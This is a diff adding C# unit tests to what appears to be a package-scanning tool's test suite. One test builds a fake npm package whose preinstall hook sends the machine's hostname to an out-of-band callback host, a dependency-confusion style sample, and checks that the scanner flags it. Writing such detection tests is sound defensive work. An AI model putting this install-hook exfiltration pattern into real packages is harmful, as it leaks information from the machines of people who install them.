@@ -291,4 +291,37 @@ public class FileBatchTests
         Assert.Contains("level1 and 0 later files are not", (string?)strings["reason"]);
         Assert.Contains(strings["result"]!["items"]!.AsArray(), i => (string?)i!["value"] == AssetFileStringsTests.Url);
     }
+
+    [Fact]
+    public async Task The_summary_names_the_file_level_and_the_findings_that_set_it()
+    {
+        using var dir = new TempDir();
+        var package = Path.Combine(dir.Path, "internal-auth-1.0.0.tgz");
+        using (var gz = new GZipStream(File.Create(package), CompressionLevel.Fastest))
+        using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
+            foreach (var (name, text) in new[]
+                     {
+                         ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
+                         ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname());"),
+                     })
+                tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
+        var (_, document, _) = await Batch("--file", package);
+        var summary = document!["summary"]!;
+        Assert.Equal("noteworthy", (string?)summary["level"]);
+        var reasons = summary["reasons"]!.AsArray();
+        Assert.Contains(reasons, r => (string?)r!["rule"] == "package/collection-url" && (string?)r["source"] == "package");
+        Assert.All(reasons, r => Assert.Equal("noteworthy", (string?)r!["level"]));
+
+        var plain = Path.Combine(dir.Path, "notes.txt");
+        File.WriteAllText(plain, "plain text");
+        var (_, other, _) = await Batch("--file", plain);
+        Assert.Equal("none", (string?)other!["summary"]!["level"]);
+        Assert.Empty(other["summary"]!["reasons"]!.AsArray());
+    }
+
+    [Fact]
+    public void A_summary_step_without_a_result_leaves_the_level_unknown()
+    {
+        Assert.Equal("unknown", (string?)ToolCli.Verdict(null)["level"]);
+    }
 }
